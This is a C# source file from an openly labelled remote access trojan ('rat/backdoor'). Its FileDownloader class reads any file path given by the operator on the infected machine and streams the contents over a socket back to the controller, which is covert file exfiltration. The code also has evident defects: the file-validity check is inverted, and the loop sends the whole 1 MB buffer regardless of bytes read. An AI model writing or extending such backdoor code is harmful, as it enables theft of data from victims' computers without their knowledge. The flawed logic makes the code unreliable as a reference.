using RAT.Interfaces;
using System.IO;

namespace RAT.Logic.RatCommands.Features
{
    /// <summary>
    /// File downloading feature for rat/backdoor.
    /// </summary>
    public class FileDownloader : IFileDownloader
    {
        private readonly ISocketConnectionSendingLogic _sendingLogic;
        private readonly ISocketConnectionConnectLogic _connectionLogic;
        private readonly ISocketConnectionDisconnectLogic _disconnectLogic;
        private readonly IClientNotificationLogic _notificationLogic;
        private readonly IFileLogic _fileLogic;

        /// <summary>
        /// File downloading feature for rat/backdoor.
        /// </summary>
        /// <param name="sendingLogic">Logic for data sending to client.</param>
        /// <param name="connectLogic">Logic for making/creating connection for sockets.</param>
        /// <param name="disconnectLogic">Logic socket disconnection.</param>
        /// <param name="notificationLogic">Logic client notifications (sending messages to client).</param>
        public FileDownloader(
            ISocketConnectionSendingLogic sendingLogic,
            ISocketConnectionConnectLogic connectLogic,
            ISocketConnectionDisconnectLogic disconnectLogic,
            IFileLogic fileLogic,
            IClientNotificationLogic notificationLogic)
        {
            _sendingLogic = sendingLogic;
            _connectionLogic = connectLogic;
            _disconnectLogic = disconnectLogic;
            _fileLogic = fileLogic;
            _notificationLogic = notificationLogic;
        }

        /// <summary>
        /// Downloads file (sends to client) by provided windows path over socket connection.
        /// </summary>
        /// <param name="path">Windows path of the file that should be downloaded.</param>
        public void DownloadFile(string path)
        {
            if (_fileLogic.IsValidFile(path))
            {
                _notificationLogic.NotifyClient($"Invalid file on path: {path}");
                return;
            }

            var socketForFileDownload = _connectionLogic.GetConnectedSocketForFileDownload();
            if (!socketForFileDownload.Connected)
            {
                return;
            }

            byte[] inputBuffer = new byte[1 * 1024 * 1024]; // Downloading by 1 MB
            using (var stream = new FileStream(path, FileMode.Open))
            {
                int bytesRead = 0;
                while ((bytesRead = stream.Read(inputBuffer, 0, inputBuffer.Length)) > 0)
                {
                    _sendingLogic.SendDataToClient(
                        socketForFileDownload, inputBuffer, _sendingLogic.OnFileSend);
                }
            }

            _notificationLogic.NotifyClient("Download finished\n");
            _disconnectLogic.DisconnectSocket(socketForFileDownload);
        }
    }
}